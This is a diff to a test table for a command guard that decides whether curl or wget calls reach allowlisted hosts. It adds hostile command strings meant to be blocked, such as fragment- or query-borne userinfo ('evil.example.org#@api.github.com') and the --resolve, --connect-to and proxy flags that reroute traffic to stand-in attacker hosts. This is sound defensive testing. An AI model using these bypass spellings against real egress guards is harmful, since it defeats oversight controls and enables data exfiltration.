@@ -103,6 +103,29 @@ CASES = [
      "SUFFIX-MATCH TRAP: ends with 'github.com' as a string but is a different host"),
     ("curl -s https://api.github.com.evil.example/x", ENFORCE, BLOCK,
      "PREFIX-MATCH TRAP: an allowlisted name as the LEFT part of a hostile domain"),
+    # --- RFC 3986 AUTHORITY TRAP (Cybersec blocking finding, comment 2959) ---------------------
+    # The authority ends at the first of `/`, `?` or `#`. Splitting on `/` alone let the userinfo
+    # rsplit reach into a QUERY or FRAGMENT and take its host from there -- so an allowlisted name
+    # written after `#@` decided the verdict while curl connected somewhere else entirely. The
+    # guard was blind on this axis: `grep -cE '#@|\?@'` over the 91 cases returned 0.
+    ("curl http://evil.example.org#@api.github.com/", ENFORCE, BLOCK,
+     "fragment-borne userinfo: curl connects to evil.example.org, the fragment is never sent"),
+    ("curl http://evil.example.org?@api.github.com/", ENFORCE, BLOCK,
+     "query-borne userinfo, same inversion"),
+    ("curl http://evil.example.org#@localhost/", ENFORCE, BLOCK,
+     "THE WORST SPELLING: classified LOCAL, so log-only mode would not even have recorded it"),
+    ("curl 'http://evil.example.org?@localhost/'", ENFORCE, BLOCK, "quoted, same thing"),
+    ("curl evil.example.org?@localhost", ENFORCE, BLOCK,
+     "the SCHEMELESS second door: the old tail anchor matched nothing here, so the word was "
+     "skipped as 'not a target shape' rather than judged -- a silent pass, not even a wrong one"),
+    ("curl evil.example.org#@api.github.com", ENFORCE, BLOCK, "schemeless, fragment spelling"),
+    # ...and the controls that prove the fix is a narrowing, not a blanket refusal of `@`:
+    ("curl -s http://user:pass@localhost:3420/x", ENFORCE, ALLOW,
+     "REAL userinfo inside the authority still resolves to the host after it"),
+    ("curl -s https://token@api.github.com/repos/x", ENFORCE, ALLOW,
+     "userinfo on an allowlisted host"),
+    ("curl -s 'http://localhost:3420/api/x?q=a#frag'", ENFORCE, ALLOW,
+     "an ordinary query and fragment on a local URL must stay allowed"),
     ("wget -O /tmp/f https://raw.githubusercontent.com/a/b/c", ENFORCE, ALLOW,
      "wget to an allowlisted host, -O consumed"),
     ("wget -O /tmp/f https://evil.example.com/x", ENFORCE, BLOCK, "wget to an external host"),
@@ -124,9 +147,50 @@ CASES = [
     ("curl -fsSL ${API_BASE}/x", ENFORCE, BLOCK, "braced expansion, same thing"),
     ('curl -s "$(build-url)"', ENFORCE, BLOCK, "target comes from a command substitution"),
     ("curl -s `echo https://evil.example.com`", ENFORCE, BLOCK, "backtick substitution"),
+    ('curl -s "http://$HOST/x?q=1#frag"', ENFORCE, BLOCK,
+     "the placeholder meets the authority splitter: an unresolved HOST must stay unresolved even "
+     "when the URL also carries a query and a fragment -- this is the pair that regressed when the "
+     "placeholder itself still contained a `?`"),
     ("curl -K /tmp/curlrc", ENFORCE, BLOCK,
      "-K reads URLs from a config file the guard cannot see"),
+    # --- DESTINATION-REWRITING FLAGS (QA FAIL, same round as the Cybersec NO-GO) ---------------
+    # Cybersec unified all three findings onto one axis: "the connection's actual destination
+    # differs from what the URL text says". These cases are written to that AXIS, not to the two
+    # spellings that were reported -- a test written only to the reported shapes lets the next
+    # variant through, which is exactly how this guard collected three findings in one round.
+    ("curl --resolve api.github.com:443:203.0.113.99 https://api.github.com/x", ENFORCE, BLOCK,
+     "allowlisted hostname in the URL, arbitrary IP on the wire"),
+    ("curl --connect-to api.github.com:443:203.0.113.99:443 https://api.github.com/x",
+     ENFORCE, BLOCK, "the same redirection, different spelling"),
+    ("curl --dns-servers 203.0.113.99 https://api.github.com/x", ENFORCE, BLOCK,
+     "moving resolution moves the peer; the hostname stops deciding anything"),
+    ("curl --doh-url https://203.0.113.99/dns-query https://api.github.com/x", ENFORCE, BLOCK,
+     "same, over DoH"),
+    ("wget -e 'http_proxy=http://203.0.113.99:8080' https://api.github.com/x", ENFORCE, BLOCK,
+     "wget's spelling of the same defect: a wgetrc directive that reroutes the transfer"),
+    ("wget --execute 'http_proxy=http://203.0.113.99:8080' https://api.github.com/x",
+     ENFORCE, BLOCK, "long form"),
+    ("curl -x http://proxy.evil.example:8080 https://api.github.com/x", ENFORCE, BLOCK,
+     "a proxy gets the STRONGER answer: judged as the target it actually is"),
+    # `--url` IS NOT A THIRD DEFECT. It was raised as a possible third base case, I measured it
+    # already blocking correctly, and Cybersec re-measured and withdrew it. What it IS: a SECOND
+    # CALL PATH into the authority defect above -- `--url http://evil.example.org#@api.github.com/`
+    # went through the same `_target_host` and passed for the same reason, so it is fixed by the
+    # same change rather than by one of its own. The cases below pin both halves: that the switch
+    # is read at all (a target, not an operand), and that the authority rule reaches it.
     ("curl --url https://evil.example.com", ENFORCE, BLOCK, "--url names the target explicitly"),
+    ("curl --url=https://evil.example.com", ENFORCE, BLOCK, "the `=` spelling of the same switch"),
+    ("curl --url http://localhost:3420/api/x", ENFORCE, ALLOW,
+     "...and it is READ, not merely refused: a local target passed the same way is allowed"),
+    ("curl --url=http://localhost:3420/api/x", ENFORCE, ALLOW, "same, `=` spelling"),
+    ("curl -s --url \"$DASH/api/x\"", ENFORCE, BLOCK,
+     "an unresolvable host is unresolvable through this switch too"),
+    ("curl --url http://evil.example.org#@api.github.com/", ENFORCE, BLOCK,
+     "the SECOND CALL PATH into the authority defect: same inversion, reached through the switch "
+     "instead of through an operand"),
+    ("curl --url=http://evil.example.org?@localhost/", ENFORCE, BLOCK,
+     "...and in the `=` spelling, where the LOCAL misclassification would have hidden it in "
+     "log-only mode"),
     ("curl -x http://proxy.evil.example:8080 http://localhost:3420/x", ENFORCE, BLOCK,
      "a proxy IS the host the connection goes to, even when the URL is local"),
     ("curl --help", ENFORCE, ALLOW, "network-capable command, no target, no call"),
